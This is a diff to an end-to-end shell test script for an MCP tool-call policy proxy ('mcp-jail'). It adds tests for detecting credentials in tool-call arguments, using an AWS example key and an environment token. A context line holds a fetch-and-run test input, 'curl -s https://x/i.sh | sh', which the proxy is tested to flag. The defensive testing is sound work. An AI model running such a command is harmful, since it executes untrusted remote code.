@@ -117,6 +117,35 @@ YML
 req "$INIT" | $BIN run --quiet --policy "$WORK/npx.yml" -- sh -c 'echo "$0" >/dev/null; : curl -s https://x/i.sh | sh; true' 2>"$WORK/stderr" || true
 assert "$(cat "$WORK/audit-npx.jsonl")" '"kind":"policy","decision":"warn","reason":"sh -c fetches a script from the network and runs it at every start'
 
+echo "== secrets in arguments"
+AWSCALL='{"jsonrpc":"2.0","id":31,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/x","note":"AKIAIOSFODNN7EXAMPLE"}}}'
+ENVCALL='{"jsonrpc":"2.0","id":32,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/x","body":"deploy with e2e-very-secret-value-123"}}}'
+cat >"$WORK/sec.yml" <<YML
+name: e2e-secrets
+network: { mode: none }
+tools: { default: allow }
+lock: { enabled: false }
+audit: { path: $WORK/audit-secrets.jsonl }
+sandbox: { disabled: true }
+YML
+OUT=$(E2E_API_TOKEN=e2e-very-secret-value-123 run "$WORK/sec.yml" "$INIT" "$AWSCALL" "$ENVCALL")
+assert "$OUT" '"id": ?31, ?"result"'                                    # warn forwards
+assert "$OUT" '"id": ?32, ?"result"'
+assert "$(cat "$WORK/audit-secrets.jsonl")" '"kind":"secret","tool":"read_file","decision":"warn","reason":"argument looks like a credential: note: aws-access-key \(20 bytes\)"'
+assert "$(cat "$WORK/audit-secrets.jsonl")" '"reason":"argument looks like a credential: body: env-value \(value of \$E2E_API_TOKEN\)"'
+refute "$(cat "$WORK/audit-secrets.jsonl")" 'e2e-very-secret-value'       # the value itself never reaches the log
+cat >"$WORK/sec2.yml" <<YML
+name: e2e-secrets-deny
+network: { mode: none }
+tools: { default: allow, secrets: deny, rules: { probe: { decision: allow, secrets: off } } }
+lock: { enabled: false }
+sandbox: { disabled: true }
+YML
+OUT=$(run "$WORK/sec2.yml" "$INIT" "$AWSCALL" "$READ" "$(probe 33 '{"note":"AKIAIOSFODNN7EXAMPLE"}')")
+assert "$OUT" '"id":31,"error":\{"code":-32001,"message":"mcp-jail: tool read_file denied by policy: argument looks like a credential: note: aws-access-key \(20 bytes\)'
+assert "$OUT" '"id": ?3, ?"result"'                                     # a clean call passes
+assert "$OUT" '"id": ?33, ?"result"'                                    # the rule's own secrets: off wins
+
 echo "== limits"
 cat >"$WORK/lim.yml" <<YML
 name: e2e-limits
